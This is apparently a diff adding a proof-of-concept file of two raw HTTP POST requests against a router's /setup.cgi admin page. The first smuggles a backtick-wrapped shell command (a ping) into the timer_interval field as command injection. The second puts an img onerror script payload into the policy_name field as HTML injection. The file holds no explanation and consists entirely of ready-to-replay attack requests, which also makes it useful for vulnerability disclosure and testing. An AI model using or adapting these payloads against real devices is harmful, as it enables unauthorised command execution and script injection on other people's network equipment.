@@ -1,0 +1,34 @@
+Command-injection:
+
+POST /setup.cgi HTTP/1.1
+Host: 192.168.178.199
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.199/setup.cgi?next_file=Setup.htm
+Authorization: Basic #########
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1051
+Connection: close
+ 
+wan_encapmode=pppoa&wan_multiplex=llc&pppoa_multiplex=vc&wan_qostype=ubr&wan_autodetect=enable&dsl_modulation=MMODE&bridged_dhcpenable=dhcp&ipppoe_enable=0&PoeUserName=admin&PoePasswd=admin&pppoeDODC=pppoeDODC&poeIdleTime=5&hostname=test&domainname=&mtu_type=auto&lan_ip_1=192&lan_ip_2=168&lan_ip_3=178&lan_ip_4=199&lan_mask=0&lan_dhcp=disable&time_zone=%2B0+2&timer_interval=`%20ping%20192%2e168%2e178%2e104%20`&upgrade_langpkt=1&save=Save+Settings&c4_wan_ip_=&c4_wan_mask_=&c4_wan_gw_=&c4_wan_dns1_=&c4_wan_dns2_=&c4_lan_ip_=192.168.178.199&c4_dhcpserver_ip_=&c4_static_dns0_=&c4_static_dns1_=&c4_static_dns2_=&c4_wan_wins_=&h_wan_encapmode=pppoa&h_wan_multiplex=llc&h_pppoa_multiplex=vc&h_wan_qostype=ubr&h_wan_autodetect=enable&h_dsl_modulation=MMODE&h_bridged_dhcpenable=dhcp&h_pppoeDODC=pppoeDODC&h_mtu_type=auto&h_lan_mask=0&h_lan_dhcp=disable&h_time_zone=%2B0+2&h_auto_dls=disable&PppoeUserName=&PppoePasswd=&PppoaUserName=admin&PppoaPasswd=admin&h_ipppoe_enable=0&h_upgrade_langpkt=1&todo=save&this_file=Setup.htm&next_file=Setup.htm&message=
+
+
+HTML-injection:
+
+POST /setup.cgi HTTP/1.1
+Host: 192.168.178.199
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.199/setup.cgi?next_file=AccessRes.htm
+Authorization: Basic xxx=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 584
+ 
+access_policy=1&f_status1=enable&policy_name=123"><img%20src%3d"0"%20onerror%3dalert("XSSed1")>&f_status2=deny&time=settimes&starthour=0&startminute=0&endhour=0&endminute=0&save=Save+Settings&h_access_policy=1&h_f_status1=enable&h_f_status2=deny&h_alldays=disable&h_sun=disable&h_mon=disable&h_tue=disable&h_wed=disable&h_thurs=disable&h_fri=disable&h_sat=disable&h_time=settimes&h_starthour=0&h_startminute=0&h_endhour=0&h_endminute=0&h_blocked_service0=None&h_blocked_service1=None&h_svc_type0=icmp&h_svc_type1=icmp&todo=save&this_file=AccessRes.htm&next_file=AccessRes.htm&message=
+ 
